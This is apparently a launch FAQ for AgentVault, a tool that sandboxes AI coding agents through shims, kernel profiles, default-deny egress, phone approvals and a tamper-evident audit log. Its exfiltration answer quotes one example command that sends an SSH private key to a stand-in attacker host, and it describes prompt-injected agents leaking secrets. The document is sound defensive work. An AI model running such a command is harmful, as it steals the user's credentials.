# Launch FAQ — pre-written answers for the predictable comments

## "PATH shims are trivially bypassed."

Correct, and the README says so in the first callout. That's why v0.2 generates a macOS Seatbelt profile from the same policy — `test/e2e/sandbox_test.go` runs `/bin/rm` directly (bypassing every shim) and asserts the kernel returns EPERM. On Linux/Windows today: userspace layers + tamper-evident audit, clearly labeled. Landlock/JobObjects are v0.3.

## "How is this different from just running in Docker/a VM?"

Weight and observability. A container gives you isolation but no per-action policy, no phone approvals, and no audit trail with a hash chain. AgentVault is the same binary you'd run anyway, plus rules and a flight recorder. (And yes, you can run it *inside* a container too — defense in depth.)

## "Why should I trust a security tool with <N stars>?"

Don't trust; verify. The repo has 135+ tests including an e2e suite that performs real attacks (direct syscalls, tampered DB rows, wrong-chat Telegram replies) and asserts they fail — plus a standalone red-team battery (`make redteam`) that runs 10 scripted attacks against the real binary and publishes the results matrix in docs/redteam/RESULTS.md, including the attacks we *don't* stop yet on platforms without a kernel backend. `agentvault verify` lets you check the audit chain yourself. SECURITY.md lists exactly what's not covered.

## "Telegram? Why not <other channel>?"

It's the fastest path to "approve from your phone" with zero infrastructure — a bot token and a chat id. The channel interface is 4 methods; PRs for Slack/ntfy/webhook are welcome.

## "What's the performance cost?"

Shim: ~3ms per intercepted command, then `exec` replaces the process (zero overhead after the verdict). Policy eval: ~1.5µs (benchmarked in CI). Egress: one extra hop on loopback.

## "Why not eBPF?"

macOS has no eBPF. Seatbelt covers macOS; Landlock is the Linux answer; both are driven by the same YAML. eBPF could come later for Linux observability, but Landlock is simpler and unprivileged.

## "Can it stop a prompt-injected agent from exfiltrating data?"

That's the design goal of the egress layer: default-deny network + approval on unknown hosts means `curl evil.com/$(cat ~/.ssh/id_rsa)` needs your explicit tap. Payload-level exfiltration over *allowed* hosts (e.g. pasting secrets into an Anthropic prompt) is out of scope — the audit log at least records that it happened.

## "License?"

Apache-2.0. No CLA, no cloud service, no telemetry, no rug-pull.
